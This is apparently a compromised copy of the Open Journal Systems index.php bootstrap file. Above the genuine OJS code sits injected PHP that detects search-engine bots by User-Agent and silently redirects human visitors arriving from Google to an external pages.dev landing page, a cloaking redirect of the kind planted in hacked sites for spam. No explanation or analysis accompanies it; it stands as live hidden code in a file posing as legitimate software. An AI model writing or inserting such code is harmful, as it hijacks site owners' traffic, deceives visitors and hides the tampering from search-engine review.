<?php
// Daftar kata kunci bot umum di User-Agent
$bot_keywords = [
    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'facebookexternalhit',
    'google', 'bing', 'yahoo', 'yandex', 'baidu', 'duckduckgo', 'curl', 'wget'
];

// Ambil referer dan user-agent
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

// Cek apakah user-agent mengandung kata kunci bot
$is_bot = false;
foreach ($bot_keywords as $keyword) {
    if (strpos($user_agent, strtolower($keyword)) !== false) {
        $is_bot = true;
        break;
    }
}

// Cek jika referer dari Google dan bukan bot
if (!$is_bot && strpos($referer, 'google') !== false) {
    header('Location: https://bagila-sikikkk-aaa.pages.dev/landing.txt');
    exit;
}

/**
 * @file index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

use APP\core\Application;

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require_once './lib/pkp/includes/bootstrap.php';

// Serve the request
Application::get()->execute();
